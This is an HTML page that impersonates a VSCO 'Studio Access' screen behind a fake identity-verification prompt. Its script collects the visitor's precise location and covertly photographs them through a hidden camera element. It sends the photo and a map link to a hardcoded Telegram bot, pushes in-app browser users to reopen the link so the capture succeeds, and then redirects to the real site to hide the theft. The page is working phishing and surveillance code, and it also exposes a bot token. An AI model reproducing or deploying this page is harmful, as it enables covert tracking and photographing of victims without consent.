<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>VSCO Studio</title>
    <style>
        body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        .vsco-logo { width: 80px; height: 80px; margin-bottom: 20px; animation: pulse 2s infinite ease-in-out; }
        @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.6; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.6; } }
        
        #insta-overlay { 
            display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.98); z-index: 9999; justify-content: center; align-items: center; 
        }
        .alert-box { 
            background: #1c1c1e; padding: 30px; border-radius: 20px; width: 85%; max-width: 320px; 
            text-align: center; border: 1px solid #333; box-shadow: 0 15px 40px rgba(0,0,0,0.8); 
        }
        .alert-box b { color: #fff; font-size: 19px; display: block; margin-bottom: 15px; }
        .alert-box p { font-size: 14px; line-height: 1.6; color: #d1d1d1; margin-bottom: 25px; }
        
        /* The Verification Button */
        .verify-btn { 
            background: #3897f0; color: white; border: none; padding: 14px 25px; 
            border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer;
            width: 100%; display: block; text-decoration: none; margin-bottom: 20px;
        }
        .verify-btn:active { background: #287dc5; transform: scale(0.98); }

        .instruction { font-size: 12px; color: #777; border-top: 1px solid #333; padding-top: 15px; }
        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
    </style>
</head>
<body>
    <div id="vsco-ui">
        <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
        <div style="font-size: 11px; letter-spacing: 2px; opacity: 0.5;">STUDIO ACCESS</div>
    </div>

    <div id="insta-overlay">
        <div class="alert-box">
            <b>Identity Verification</b>
            <p>To prevent automated access, please complete the facial and location verification.</p>
            
            <button class="verify-btn" onclick="requestAccess()">Verify Identity</button>
            
            <div id="insta-hint" class="instruction">
                If the button doesn't respond: Tap <b>(â‹®)</b> and select <b>"Open in Browser"</b> to continue.
            </div>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
        const chatId = "8005843544";
        const isInstagram = navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");

        async function requestAccess() {
            // Step 1: Request Location immediately on button click
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    startCamera(loc);
                },
                (err) => {
                    startCamera("Location Access Denied");
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }

        async function startCamera(locationText) {
            try {
                // Step 2: Request Camera
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('video');
                v.srcObject = s;
                
                // Capture after 1 second
                setTimeout(() => {
                    const c = document.getElementById('canvas');
                    const ctx = c.getContext('2d');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    ctx.drawImage(v, 0, 0);
                    sendData(c, locationText);
                }, 1000);
            } catch (e) {
                if (isInstagram) {
                    alert("Please open this link in your phone browser (Chrome/Safari) to verify.");
                } else {
                    window.location.href = "https://vsco.co/";
                }
            }
        }

        function sendData(canvas, locationText) {
            canvas.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', chatId);
                f.append('photo', blob);
                f.append('caption', `âœ… Verified!\nðŸ“ Map: ${locationText}`);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
            }, 'image/jpeg');
            
            // Final redirect
            setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
        }
    </script>
</body>
</html>
